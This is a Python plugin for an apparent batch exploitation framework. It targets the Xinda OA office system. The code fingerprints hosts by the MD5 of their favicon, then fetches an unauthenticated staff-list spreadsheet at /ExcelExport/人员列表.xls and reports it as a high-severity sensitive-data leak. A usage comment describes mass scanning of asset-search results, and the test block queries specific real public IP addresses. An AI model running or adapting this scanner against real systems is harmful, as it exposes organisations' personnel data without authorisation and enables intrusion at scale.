# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 13:39

import hashlib
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *


# app="信达-OA"
# python batch.py -m exploit.web.OA.xDoa.sensitive -cs -fs "app=\"信达-OA\""

class Script(BaseScript):
    name = 'XDoa'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.SENSITIVE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/images/favicon.ICO']
        # exec
        self.execPathList = ['/ExcelExport/人员列表.xls']
        # session
        self.session = session
        # 相关信息
        self.info = ''
        self.favicon = ['d8028456021988373d7eca8b7ec28f09']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('xDoa Finger', url))
                                return {'name': 'xDoa Finger', 'url': url, 'software': 'xDoa'}
        except Exception:
            return None

    async def exec(self):
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                async with self.session.get(url=url, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        tqdm.write(Fore.RED + '[{}] {}'.format('xDoa Sensitive Infor', url))
                        return {'name': 'xDoa Sensitive Infor', 'url': url, 'software': 'xDoa'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('http://58.18.167.226:8088/images/favicon.ICO', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
